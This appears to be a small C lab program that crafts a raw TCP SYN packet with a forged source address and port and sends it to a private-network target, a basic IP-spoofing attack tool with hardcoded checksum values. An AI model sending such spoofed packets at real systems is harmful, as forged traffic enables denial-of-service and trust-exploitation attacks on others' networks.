#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>


#include <linux/ip.h>
#include <linux/tcp.h>

#define TARGET_IP "172.16.241.2"
#define TARGET_PORT 80 
#define SPOOFED_IP "192.168.32.138"
#define SPOOFED_PORT 22 

int main()
{

        unsigned char packet[40];
        int raw_socket;
        int on = 1 ;

        struct iphdr *iphdr;
        struct tcphdr *tcphdr;
        struct sockaddr_in address;
        raw_socket = socket( AF_INET, SOCK_RAW, IPPROTO_RAW );
        setsockopt( raw_socket, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on) );

	tcphdr = (struct tcphdr *)(packet + 20 );
	memset( (char *)tcphdr, 0, 20 );
        tcphdr->source = htons(SPOOFED_PORT );
        tcphdr->dest = htons(TARGET_PORT );
        tcphdr->seq = htonl( 922405111 );
        tcphdr->ack_seq = htonl( 0 );
        tcphdr->doff = 5;
        tcphdr->syn = 1;
        tcphdr->window = htons( 512 );
        tcphdr->check = htons(5588);
        iphdr = (struct iphdr *)packet;
        memset( (char *)iphdr, 0, 20 );
        iphdr->version = 4;
        iphdr->ihl = 5;
        iphdr->protocol = IPPROTO_TCP;
        iphdr->tot_len = 40;
        iphdr->id = htons( 777 );
        iphdr->ttl = 60;
        iphdr->check = 1;
        iphdr->saddr = inet_addr(SPOOFED_IP );
        iphdr->daddr = inet_addr(TARGET_IP);

        address.sin_family = AF_INET;
        address.sin_port = htons(TARGET_PORT);
        address.sin_addr.s_addr = inet_addr(TARGET_IP);

	sendto( raw_socket, &packet, sizeof(packet), 0x0,
	(struct sockaddr *)&address, sizeof(address));
}
